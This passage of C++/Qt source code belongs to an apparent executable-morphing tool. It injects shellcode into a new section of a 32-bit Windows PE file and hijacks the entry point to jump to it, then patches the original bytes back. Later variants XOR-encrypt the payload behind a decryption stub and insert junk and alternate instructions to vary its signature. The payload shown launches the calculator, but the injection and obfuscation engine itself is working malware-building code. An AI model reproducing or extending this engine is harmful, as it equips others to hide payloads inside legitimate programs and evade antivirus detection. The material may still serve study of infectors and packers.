    printf("ImageBase : 0x%x\nLoaded Entry point : 0x%x\n", this->image_NT_header_ptr->OptionalHeader.ImageBase, this->entry_point_of_text_section);

    //saving the file and section alignments in variables
    this->file_alignment =this->image_NT_header_ptr->OptionalHeader.FileAlignment;
    this->section_alignment = this->image_NT_header_ptr->OptionalHeader.SectionAlignment;

    // This cursor will be used to cycle through each section in the pe file
    // need to add exe file offset + the size of an IMAGE_NT_HEADERS32 struct to get to the first section
    unsigned int section_header_cursor = exe_header_file_offset + sizeof(IMAGE_NT_HEADERS32);

    //storing all image section headers inside a vector
    store_image_section_headers_in_vec(buffer, image_section_header_vec,
                                       image_NT_header_ptr, section_header_cursor);

    //getting the index of the .text section inside the image_section_header_vec
    morph_status = get_section_header_index_by_name(TEXT_SECTION_NAME, image_section_header_vec,image_NT_header_ptr,index_of_text_section);
    error_warning_message_box(morph_status);

    //getting the raw data offset of the .text section via image_section_header_vec
    //note that the above function saved the index of the .text section
    this->text_section_raw_data_offset = this->image_section_header_vec[this->index_of_text_section]->PointerToRawData;

    //storing the whole .text section inside the text_section_header_ptr
    this->text_section_header_ptr = this->image_section_header_vec[this->index_of_text_section];

    //getting the raw data size of the .text section via text_section_header_ptr
    this->size_of_text_section = this->text_section_header_ptr->SizeOfRawData;

    //setting the characteristics to read/write/execute
    this->text_section_header_ptr->Characteristics = SECTION_CHARACTERISTICS_TO_SET;

    //setting the payload section name from payload_section_name (randomized earlier),
    //which is at the end of the image_section_header_vec
    set_new_section_name(this->image_section_header_vec[this->image_section_header_vec.size()-1],
                           payload_section_name);


    //getting the index of the .payload section inside the image_section_header_vec
    morph_status = get_section_header_index_by_name(payload_section_name, image_section_header_vec,
                                              image_NT_header_ptr,index_of_payload_section);
    error_warning_message_box(morph_status);

    //storing the whole .payload section inside the payload_section_header_ptr
    this->payload_section_header_ptr = image_section_header_vec[index_of_payload_section];

    //gets the index corresponding to the radio button
    int chosen_payload_index = get_payload_radio_button();


    switch(chosen_payload_index)
    {
        case 0:
            set_morphed_exe_name(exe_file_path,"_CALC");
            this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
            populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
            break;

        default:
            break;
    }

    //setting the full file path
    set_morphed_exe_file_path(exe_file_path);

    //calculate the file alignment factor to align the section
    calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);

    //calculate the payload raw data size via file_alignment
    this->payload_raw_data_size = this->file_alignment_factor * this->file_alignment;

    //calculate the section alignment factor for the section
    //needs the virtual size of the section before the payload section for calculation
    calculate_section_alignment_factor(payload_num_of_bytes,section_alignment,section_alignment_factor,
                                       image_section_header_vec[index_of_payload_section-1]);

    //calculate payloads virtual size via section alignment
    this->payload_virtual_size = this->section_alignment_factor * this->section_alignment;

    //calculate payloads raw address
    //previous raw size + previous raw data offset
    this->payload_raw_address = image_section_header_vec[index_of_payload_section-1]->SizeOfRawData
                                + image_section_header_vec[index_of_payload_section-1]->PointerToRawData;

    //calculate the payloads va
    //previous virtual address + payloads virtual size
    this->payload_virtual_address = image_section_header_vec[index_of_payload_section-1]->VirtualAddress
                                    + this->payload_virtual_size;

    //setting the relevant values in the new payload section header via payload_section_header_ptr
    init_payload_section_header(this->payload_section_header_ptr,
                                this->payload_raw_address,
                                this->payload_raw_data_size,
                                this->payload_virtual_address,
                                this->payload_virtual_size,
                                this->SECTION_CHARACTERISTICS_TO_SET);

    //setting the new size of the pe file
    //via image_NT_header_ptr by adding on the payload_virtual_size
    this->image_NT_header_ptr->OptionalHeader.SizeOfImage += this->payload_virtual_size;

    //this is the section pivot gadget for the payload section,
    //which is used to patch back the .text section
    //currently this value is when the PE is loaded, hence we add the raw data offset of the text section
    this->starting_of_text_section_offset_on_load = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
                                    this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
                                    this->text_section_raw_data_offset;

    //getting image base via image_NT_header_ptr optional header
    this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;

    //getting the start of the payload section, which is image base + payload virtual size
    this->start_of_payload_section_offset = this->image_base + this->payload_virtual_address;

    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string
    std::string jump_to_payload_asm = "mov ecx, ";
    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->start_of_payload_section_offset) + ";";
    jump_to_payload_asm += "jmp ecx;";
    this->machine_code_vec.clear(); //clear vector to input new machine code

    //and converting assembly syntax into machine code
    morph_status = asm_to_machine_code(jump_to_payload_asm,this->machine_code_vec,this->machine_code_num_of_bytes);
    error_warning_message_box(morph_status);

    //storing the byte length of the section pivot gadget
    this->jump_to_payload_byte_length = this->machine_code_num_of_bytes;

    //putting original text section data into a pointer, to be added into the buffer later
    this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
                                                                      this->text_section_raw_data_offset,
                                                                      this->size_of_text_section);
    //storing the original text section into a pointer, for calculation
    this->text_section_buffer_ptr = this->text_section_buffer_original;


    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
    //will be used to put into the actual buffer later
    //starting_of_text_section_offset_on_load must subtract by the text_section_raw_data_offset
    //to get to the physical memory of the buffer
    editing_text_section_ptr(this->text_section_buffer_ptr,
                             this->jump_to_payload_byte_length,
                             this->starting_of_text_section_offset_on_load - this->text_section_raw_data_offset,
                             this->machine_code_vec);


    //stores the payload into a variable char* and the ptr is to do calculation
    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
    char *payload_section_buffer_ptr = payload_section_buffer_original;

    //we need to store the payload entry point address into edi, so that stosd will work as intended
    //safe practice, incase edi was used or modified previously
    std::string store_payload_entry_point_in_edi_asm = "";
    store_edi(store_payload_entry_point_in_edi_asm,this->entry_point_of_text_section);
    this->machine_code_vec.clear();
    asm_to_machine_code(store_payload_entry_point_in_edi_asm,
                        this->machine_code_vec,this->machine_code_num_of_bytes);

    populate_section_ptr(payload_section_buffer_ptr,
                                reinterpret_cast<char*>(this->machine_code_vec.data()),
                                this->machine_code_num_of_bytes);


    //here we memorize the original bytes of the text section
    //this will be used in the payload section to patch back the overwritten text section bytes
    std::string text_section_memorized_entry_bytes = "";

    //stosd can only store a certain amount of dwords
    //this is to calculate how many stosd we need
    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
    calculate_num_of_stosd_for_patching(text_section_memorized_entry_bytes,
                                        this->num_of_stosd,
                                        this->jump_to_payload_byte_length,
                                        this->starting_of_text_section_offset_on_load,
                                        this->buffer);



    //getting the stosd instructions asm, afew calculations must be done for big to little endian conversion
    std::string patching_entry_bytes_asm = "";
    get_stosd_instruction_asm(patching_entry_bytes_asm,
                              text_section_memorized_entry_bytes,
                              this->num_of_stosd);

    //converting patching_entry_bytes_asm to machine code
    this->machine_code_vec.clear();
    asm_to_machine_code(patching_entry_bytes_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);


    //writing the machine code into payload_section_buffer_ptr
    //this will be used later to write back to the buffer
    populate_section_ptr(payload_section_buffer_ptr,
                                reinterpret_cast<char*>(this->machine_code_vec.data()),
                                this->machine_code_num_of_bytes);

    //putting in the payload into payload_section_buffer_ptr
    populate_section_ptr(payload_section_buffer_ptr,
                         reinterpret_cast<char*>(this->payload_vec.data()),
                         this->payload_num_of_bytes);

    //getting the asm instructions to jump back to the text section
    std::string jump_back_to_text_section_asm = "";
    get_jump_back_to_text_section_instruction_asm(jump_back_to_text_section_asm
                                                  ,this->entry_point_of_text_section);

    //converting the above asm instructions to machine code
    machine_code_vec.clear();
    asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);

    //putting in the jump back to text section into payload_section_buffer_ptr
    populate_section_ptr(payload_section_buffer_ptr,
                         reinterpret_cast<char*>(this->machine_code_vec.data()),
                         this->machine_code_num_of_bytes);



    //===================================================================================
    rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
    //replacing back the edited image_NT_header_ptr into the buffer
    //number of sections was increased by 1
    //new size of the pe file was set
    //by adding the payload_virtual_size to SizeOfImage
    this->buffer_cursor = this->exe_header_file_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->image_NT_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_NT_HEADERS32));

    //need to be used to find the payload section later
    unsigned int start_of_section_headers_offset = this->buffer_cursor + sizeof(IMAGE_NT_HEADERS32);

    //need to add the cursor + the size of IMAGE_NT_HEADERS32 + the index_of_text_section * size of IMAGE_SECTION_HEADER
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER));
    //this->buffer_cursor += this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER);
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //putting in the new payload section header
    //payload raw address is previous raw size + previous raw data offset
    //payload raw data size was calculated via file_alignment
    //payload virtual size is calculated via section alignment
    //payload virtual address is previous virtual address + payloads virtual size
    //payload characteristics is set to read/write/execute
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_payload_section * sizeof(IMAGE_SECTION_HEADER));
    rewrite_bytes_to_buffer(this->buffer, (char*)this->payload_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //need to resize buffer to accomodate the new payload section
    __int64 new_buffer_size = this->buffer.size() + this->payload_raw_data_size;
    this->buffer.resize(new_buffer_size);

    //start at the payload_section_header_ptr pointer to raw data
    //putting in the payload into buffer
    this->buffer_cursor = this->payload_section_header_ptr->PointerToRawData;
    rewrite_bytes_to_buffer(this->buffer, (char*)payload_section_buffer_original,
                            this->buffer_cursor,this->payload_raw_data_size);

    this->buffer_cursor = this->text_section_raw_data_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_buffer_original,
                            this->buffer_cursor,this->size_of_text_section);


     print_section_headers(image_section_header_vec);
    //writing to file
    write_exe_file(this->morphed_exe_file_path, this->buffer);
    //free memory
    delete[] payload_section_buffer_original;
    payload_section_buffer_ptr = nullptr;
    delete payload_section_buffer_ptr;

    std::cout << std::endl;

    return SUCCESS_MORPHED_EXECUTABLE;
}

QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_path)
{
    //srand(time(NULL));
    QString morph_status = "";
    //reading bytes of a exe file
    morph_status = read_file_into_vector(exe_file_path);
    error_warning_message_box(morph_status);

    //get image dos header pointer
    //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
    this->dos_header_ptr = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);

    //validate the image dos header must be equals to MZ(ASCII)
    morph_status = validate_image_dos_signature(dos_header_ptr);
    error_warning_message_box(morph_status);


    // getting image_NT_header_cursor and setting exe_header_file_offset
    // Here we are assuming that buffer has the same bytes as the original file
    // so we need to get the exe_header_file_offset
    // which is the value of the e_lfanew attribute in dos_header_pointer
    this->image_NT_header_file_cursor = this->dos_header_ptr->e_lfanew;
    this->exe_header_file_offset = this->image_NT_header_file_cursor;

    // get the image_NT_header_ptr
    // the offset is at e_lfanew which is stored in image_NT_header_file_cursor
    this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,image_NT_header_file_cursor);

    //validate the file PE signature must be equal to some dog shit
    morph_status = validate_PE_signature(image_NT_header_ptr);
    error_warning_message_box(morph_status);


    printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
    //increasing the number of sections to allocate memory for payload
    this->image_NT_header_ptr->FileHeader.NumberOfSections += 1;
    printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);

    //randomizing the new payload section name
    const std::string payload_section_name = randomize_payload_section_name();


     //this is the entry point when the pe file is loaded to virtual memory
    //must add image base + the address of entry point
    this->entry_point_of_text_section = this->image_NT_header_ptr->OptionalHeader.ImageBase + this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint;
    printf("ImageBase : 0x%x\nLoaded Entry point : 0x%x\n", this->image_NT_header_ptr->OptionalHeader.ImageBase, this->entry_point_of_text_section);

    //saving the file and section alignments in variables
    this->file_alignment =this->image_NT_header_ptr->OptionalHeader.FileAlignment;
    this->section_alignment = this->image_NT_header_ptr->OptionalHeader.SectionAlignment;

    // This cursor will be used to cycle through each section in the pe file
    // need to add exe file offset + the size of an IMAGE_NT_HEADERS32 struct to get to the first section
    unsigned int section_header_cursor = exe_header_file_offset + sizeof(IMAGE_NT_HEADERS32);

    //storing all image section headers inside a vector
    store_image_section_headers_in_vec(buffer, image_section_header_vec,
                                       image_NT_header_ptr, section_header_cursor);

    //getting the index of the .text section inside the image_section_header_vec
    morph_status = get_section_header_index_by_name(TEXT_SECTION_NAME, image_section_header_vec,image_NT_header_ptr,index_of_text_section);
    error_warning_message_box(morph_status);

    //getting the raw data offset of the .text section via image_section_header_vec
    //note that the above function saved the index of the .text section
    this->text_section_raw_data_offset = this->image_section_header_vec[this->index_of_text_section]->PointerToRawData;

    //storing the whole .text section inside the text_section_header_ptr
    this->text_section_header_ptr = this->image_section_header_vec[this->index_of_text_section];

    //getting the raw data size of the .text section via text_section_header_ptr
    this->size_of_text_section = this->text_section_header_ptr->SizeOfRawData;

    //setting the characteristics to read/write/execute
    this->text_section_header_ptr->Characteristics = SECTION_CHARACTERISTICS_TO_SET;

    //setting the payload section name from payload_section_name (randomized earlier),
    //which is at the end of the image_section_header_vec
    set_new_section_name(this->image_section_header_vec[this->image_section_header_vec.size()-1],
                           payload_section_name);


    //getting the index of the .payload section inside the image_section_header_vec
    morph_status = get_section_header_index_by_name(payload_section_name, image_section_header_vec,
                                              image_NT_header_ptr,index_of_payload_section);
    error_warning_message_box(morph_status);

    //storing the whole .payload section inside the payload_section_header_ptr
    this->payload_section_header_ptr = image_section_header_vec[index_of_payload_section];

    //gets the index corresponding to the radio button
    int chosen_payload_index = get_payload_radio_button();


    switch(chosen_payload_index)
    {
        case 0:
            set_morphed_exe_name(exe_file_path,"_calc");
            this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
            populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);

            break;

        default:
            break;
    }


    error_warning_message_box(morph_status);

    //setting the full file path
    set_morphed_exe_file_path(exe_file_path);

    //calculate the file alignment factor to align the section
    calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);

    //calculate the payload raw data size via file_alignment
    this->payload_raw_data_size = this->file_alignment_factor * this->file_alignment;

    //calculate the section alignment factor for the section
    //needs the virtual size of the section before the payload section for calculation
    calculate_section_alignment_factor(payload_num_of_bytes,section_alignment,section_alignment_factor,
                                       image_section_header_vec[index_of_payload_section-1]);

    //calculate payloads virtual size via section alignment
    this->payload_virtual_size = this->section_alignment_factor * this->section_alignment;

    //calculate payloads raw address
    //previous raw size + previous raw data offset
    this->payload_raw_address = image_section_header_vec[index_of_payload_section-1]->SizeOfRawData
                                + image_section_header_vec[index_of_payload_section-1]->PointerToRawData;



    //calculate the payloads va
    //previous virtual address + payloads virtual size
    this->payload_virtual_address = image_section_header_vec[index_of_payload_section-1]->VirtualAddress
                                    + this->payload_virtual_size;



    //setting the relevant values in the new payload section header via payload_section_header_ptr
    init_payload_section_header(this->payload_section_header_ptr,
                                this->payload_raw_address,
                                this->payload_raw_data_size,
                                this->payload_virtual_address,
                                this->payload_virtual_size,
                                this->SECTION_CHARACTERISTICS_TO_SET);

    //setting the new size of the pe file
    //via image_NT_header_ptr by adding on the payload_virtual_size
    this->image_NT_header_ptr->OptionalHeader.SizeOfImage += this->payload_virtual_size;

    //this is the section pivot gadget for the payload section,
    //which is used to patch back the .text section
    //currently this value is when the PE is loaded, hence we add the raw data offset of the text section
    this->starting_of_text_section_offset_on_load = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
                                    this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
                                    this->text_section_raw_data_offset;

    //getting image base via image_NT_header_ptr optional header
    this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;

    //generating a random key for encryption scheme
    this->random_key = generate_random_key();

    unsigned int length_of_random_key = sizeof(random_key);


    //getting the start of the payload section, which is image base + payload virtual size
    this->start_of_payload_section_offset = this->image_base + this->payload_virtual_address;


    std::cout << " THE PAYLOADS OFFSET: " << convert_num_to_hex<DWORD>(start_of_payload_section_offset) << std::endl;

    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string.
    //since random key is stored in the first byte, the offset needs to + the length of the random key
    std::string jump_to_payload_asm = "mov ecx, ";
    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->start_of_payload_section_offset + length_of_random_key) + ";";
    jump_to_payload_asm += "jmp ecx;";
    this->machine_code_vec.clear(); //clear vector to input new machine code

    //and converting assembly syntax into machine code
    morph_status = asm_to_machine_code(jump_to_payload_asm,this->machine_code_vec,this->machine_code_num_of_bytes);
    error_warning_message_box(morph_status);

    //storing the byte length of the section pivot gadget
    this->jump_to_payload_byte_length = this->machine_code_num_of_bytes;

    //putting original text section data into a pointer, to be added into the buffer later
    this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
                                                                      this->text_section_raw_data_offset,
                                                                      this->size_of_text_section);
    //storing the original text section into a pointer, for calculation
    this->text_section_buffer_ptr = this->text_section_buffer_original;


    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
    //will be used to put into the actual buffer later
    //starting_of_text_section_offset_on_load must subtract by the text_section_raw_data_offset
    //to get to the physical memory of the buffer
    editing_text_section_ptr(this->text_section_buffer_ptr,
                             this->jump_to_payload_byte_length,
                             this->starting_of_text_section_offset_on_load - this->text_section_raw_data_offset,
                             this->machine_code_vec);


    //stores the payload into a variable char* and the ptr is to do calculation
    char *payload_section_buffer_original = new char [this->payload_raw_data_size];
    char *payload_section_buffer_ptr = payload_section_buffer_original;


    //to store the bytes after the decryption instruction bytes
    //so we can populate the rest in one pass
    std::vector<unsigned char> bytes_after_decryption_instructions_vec;

    //we need to store the payload entry point address into edi, so that stosd will work as intended
    //safe practice, incase edi was used or modified previously
    std::string store_payload_entry_point_in_edi_asm = "";
    store_edi(store_payload_entry_point_in_edi_asm,this->entry_point_of_text_section);
    this->machine_code_vec.clear();
    asm_to_machine_code(store_payload_entry_point_in_edi_asm,
                        this->machine_code_vec,this->machine_code_num_of_bytes);

    //adding the mov edi instructions into the vector
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);

    //here we memorize the original bytes of the text section
    //this will be used in the payload section to patch back the overwritten text section bytes
    std::string text_section_memorized_entry_bytes = "";

    //stosd can only store a certain amount of dwords
    //this is to calculate how many stosd we need
    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
    calculate_num_of_stosd_for_patching(text_section_memorized_entry_bytes,
                                        this->num_of_stosd,
                                        this->jump_to_payload_byte_length,
                                        this->starting_of_text_section_offset_on_load,
                                        this->buffer);



    //getting the stosd instructions asm, afew calculations must be done for big to little endian conversion
    std::string patching_entry_bytes_asm = "";
    get_stosd_instruction_asm(patching_entry_bytes_asm,
                              text_section_memorized_entry_bytes,
                              this->num_of_stosd);

    //converting patching_entry_bytes_asm to machine code
    this->machine_code_vec.clear();
    asm_to_machine_code(patching_entry_bytes_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);

    std::cout << " THE PAYLOADS OFFSET + PATCHING ENTRY: " <<
                 convert_num_to_hex<DWORD>(start_of_payload_section_offset + machine_code_num_of_bytes) << std::endl;

    //adding the patching_entry_bytes_asm instructions into the vector
    //currently has mov edi instructions + this patching_entry_bytes_asm
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);

    //adding the payload instructions into the vector
    //currently has mov edi instructions + patching_entry_bytes_asm + this payload instructions
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->payload_vec);

    //getting the asm instructions to jump back to the text section
    std::string jump_back_to_text_section_asm = "";
    get_jump_back_to_text_section_instruction_asm(jump_back_to_text_section_asm
                                                  ,this->entry_point_of_text_section);

    //converting the above asm instructions to machine code
    machine_code_vec.clear();
    asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);

    //adding the jump back to text section instructions into the vector
    //currently has mov edi instructions + patching_entry_bytes_asm + payload instructions
    // + this jump back to text section instructions
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);

    //encrypting contents of the vector, by xor with the random key
    encrypt_bytes_after_decryption_instruction_vec(bytes_after_decryption_instructions_vec,this->random_key);


    // ================== START HERE FOR DECRYPTION SCHEME ================================
    std::cout << "CMP EAX, instruction: " << bytes_after_decryption_instructions_vec.size() << std::endl;
    std::string decrypt_asm = "";
    get_decryption_asm(decrypt_asm,
                       this->start_of_payload_section_offset,
                       length_of_random_key,
                       this->machine_code_vec,
                       this->machine_code_num_of_bytes,
                       bytes_after_decryption_instructions_vec.size());

    //putting a random key into the beginning of the payload section
    add_random_key_to_payload_section_buffer_ptr(payload_section_buffer_ptr, this->random_key);


    //adding in the decryption routine into payload_section_buffer_ptr
    //(this->machine_code_vec.data()) contains the decryption routine
    populate_section_ptr(payload_section_buffer_ptr,
                         reinterpret_cast<char*>(this->machine_code_vec.data()),
                         this->machine_code_num_of_bytes);


    //putting in the jump back to text section into payload_section_buffer_ptr
    populate_section_ptr(payload_section_buffer_ptr,
                         reinterpret_cast<char*>(bytes_after_decryption_instructions_vec.data()),
                         bytes_after_decryption_instructions_vec.size());


    //===================================================================================

    rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
    //replacing back the edited image_NT_header_ptr into the buffer
    //number of sections was increased by 1
    //new size of the pe file was set
    //by adding the payload_virtual_size to SizeOfImage
    this->buffer_cursor = this->exe_header_file_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->image_NT_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_NT_HEADERS32));

    //need to be used to find the payload section later
    unsigned int start_of_section_headers_offset = this->buffer_cursor + sizeof(IMAGE_NT_HEADERS32);

    //need to add the cursor + the size of IMAGE_NT_HEADERS32 + the index_of_text_section * size of IMAGE_SECTION_HEADER
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER));
    //this->buffer_cursor += this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER);
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //putting in the new payload section header
    //payload raw address is previous raw size + previous raw data offset
    //payload raw data size was calculated via file_alignment
    //payload virtual size is calculated via section alignment
    //payload virtual address is previous virtual address + payloads virtual size
    //payload characteristics is set to read/write/execute
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_payload_section * sizeof(IMAGE_SECTION_HEADER));
    rewrite_bytes_to_buffer(this->buffer, (char*)this->payload_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //need to resize buffer to accomodate the new payload section
    __int64 new_buffer_size = this->buffer.size() + this->payload_raw_data_size;
    this->buffer.resize(new_buffer_size);

    //start at the payload_section_header_ptr pointer to raw data
    //putting in the payload into buffer
    this->buffer_cursor = this->payload_section_header_ptr->PointerToRawData;
    rewrite_bytes_to_buffer(this->buffer, (char*)payload_section_buffer_original,
                            this->buffer_cursor,this->payload_raw_data_size);

    this->buffer_cursor = this->text_section_raw_data_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_buffer_original,
                            this->buffer_cursor,this->size_of_text_section);


    // print_section_headers(image_section_header_vec);
    //writing to file
    write_exe_file(this->morphed_exe_file_path, this->buffer);
    //free memory
    delete[] payload_section_buffer_original;
    payload_section_buffer_ptr = nullptr;
    delete payload_section_buffer_ptr;

    std::cout << std::endl;

    return SUCCESS_MORPHED_EXECUTABLE;
}


QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instructions(QString exe_file_path)
{

    QDateTime start = QDateTime::currentDateTime(); // the moment this function is called

    srand(time(NULL));

    //reading bytes of a exe file
    this->morph_status = read_file_into_vector(exe_file_path);
    error_warning_message_box(this->morph_status);

    if(this->morph_status.contains("ERROR") == true)
    {
        return this->morph_status;
    }

    //get image dos header pointer
    //image_dos_header_file_cursor is at offset 0 as this pe header is located at the first offset of the exe
    this->dos_header_ptr = get_ptr_image_dos_header(this->buffer,this->image_dos_header_file_cursor);

    //validate the image dos header must be equals to MZ(ASCII)
    this->morph_status = validate_image_dos_signature(dos_header_ptr);
    error_warning_message_box(this->morph_status);

    if(this->morph_status.contains("ERROR") == true)
    {
        return this->morph_status;
    }



    // getting image_NT_header_cursor and setting exe_header_file_offset
    // Here we are assuming that buffer has the same bytes as the original file
    // so we need to get the exe_header_file_offset
    // which is the value of the e_lfanew attribute in dos_header_pointer
    this->image_NT_header_file_cursor = this->dos_header_ptr->e_lfanew;
    this->exe_header_file_offset = this->image_NT_header_file_cursor;

    // get the image_NT_header_ptr
    // the offset is at e_lfanew which is stored in image_NT_header_file_cursor
    this->image_NT_header_ptr = get_ptr_image_NT_header(this->buffer,this->image_NT_header_file_cursor);

    //validate the file PE signature must be equal to 0x00004550
    this->morph_status = validate_PE_signature(this->image_NT_header_ptr);
    error_warning_message_box(this->morph_status);

    if(this->morph_status.contains("ERROR") == true)
    {
        return this->morph_status;
    }

    printf("Before: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);
    //increasing the number of sections to allocate memory for payload
    this->image_NT_header_ptr->FileHeader.NumberOfSections += 1;
    printf("After: Number of Sections : 0x%x\n", this->image_NT_header_ptr->FileHeader.NumberOfSections);

    //randomizing the new payload section name
    const std::string payload_section_name = randomize_payload_section_name();


     //this is the entry point when the pe file is loaded to virtual memory
    //must add image base + the address of entry point
    this->entry_point_of_text_section = this->image_NT_header_ptr->OptionalHeader.ImageBase + this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint;
    printf("ImageBase : 0x%x\nLoaded Entry point : 0x%x\n", this->image_NT_header_ptr->OptionalHeader.ImageBase, this->entry_point_of_text_section);

    //saving the file and section alignments in variables
    this->file_alignment =this->image_NT_header_ptr->OptionalHeader.FileAlignment;
    this->section_alignment = this->image_NT_header_ptr->OptionalHeader.SectionAlignment;

    // This cursor will be used to cycle through each section in the pe file
    // need to add exe file offset + the size of an IMAGE_NT_HEADERS32 struct to get to the first section
    unsigned int section_header_cursor = this->exe_header_file_offset + sizeof(IMAGE_NT_HEADERS32);

    //storing all image section headers inside a vector
    store_image_section_headers_in_vec(this->buffer, this->image_section_header_vec,
                                       this->image_NT_header_ptr, section_header_cursor);

    //getting the index of the .text section inside the image_section_header_vec
    this->morph_status = get_section_header_index_by_name(TEXT_SECTION_NAME, this->image_section_header_vec,this->image_NT_header_ptr,index_of_text_section);
    error_warning_message_box(this->morph_status);

    if(this->morph_status.contains("ERROR") == true)
    {
        return this->morph_status;
    }

    //getting the raw data offset of the .text section via image_section_header_vec
    //note that the above function saved the index of the .text section
    this->text_section_raw_data_offset = this->image_section_header_vec[this->index_of_text_section]->PointerToRawData;

    //storing the whole .text section inside the text_section_header_ptr
    this->text_section_header_ptr = this->image_section_header_vec[this->index_of_text_section];

    //getting the raw data size of the .text section via text_section_header_ptr
    this->size_of_text_section = this->text_section_header_ptr->SizeOfRawData;

    //setting the characteristics to read/write/execute
    this->text_section_header_ptr->Characteristics = SECTION_CHARACTERISTICS_TO_SET;

    //setting the payload section name from payload_section_name (randomized earlier),
    //which is at the end of the image_section_header_vec
    set_new_section_name(this->image_section_header_vec[this->image_section_header_vec.size()-1],
                           payload_section_name);


    //getting the index of the .payload section inside the image_section_header_vec
    this->morph_status = get_section_header_index_by_name(payload_section_name, this->image_section_header_vec,
                                              this->image_NT_header_ptr,index_of_payload_section);
    error_warning_message_box(this->morph_status);

    if(this->morph_status.contains("ERROR") == true)
    {
        return this->morph_status;
    }

    //storing the whole .payload section inside the payload_section_header_ptr
    this->payload_section_header_ptr = this->image_section_header_vec[index_of_payload_section];

    //gets the index corresponding to the radio button
    int chosen_payload_index = get_payload_radio_button();

	//get payload chosen
    switch(chosen_payload_index)
    {
        case 0:
            set_morphed_exe_name(exe_file_path,"_CALC_SHELLCODE");
            this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
            populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
            break;

        default:
            break;
    }
	
	//for disassembly
    std::vector<Disassembly> temp_dis_asm_vec;
    this->morph_status = machine_code_to_asm(this->payload_vec,temp_dis_asm_vec);

    error_warning_message_box(this->morph_status);
    if(this->morph_status.contains("ERROR") == true)
    {
        return this->morph_status;
    }

    this->disassembly_log += concat_disassembly(temp_dis_asm_vec,this->morphed_exe_name + QString(" : ORIGINAL PAYLOAD"));

    //adding junk instructions
    std::vector<uint64_t> address_of_insertions_vec;
    std::vector<Disassembly> jump_instructions_vec;

    add_junk_instructions(this->payload_vec,
                          this->dis_asm_vec,
                          this->machine_code_vec,
                          this->machine_code_num_of_bytes,
                          address_of_insertions_vec,
                          jump_instructions_vec);


    //adding alt instructions
    check_for_relative_jumps(this->dis_asm_vec);

    add_conditional_jumps_instructions(this->dis_asm_vec,
                                       this->machine_code_vec,
                                       this->machine_code_num_of_bytes);

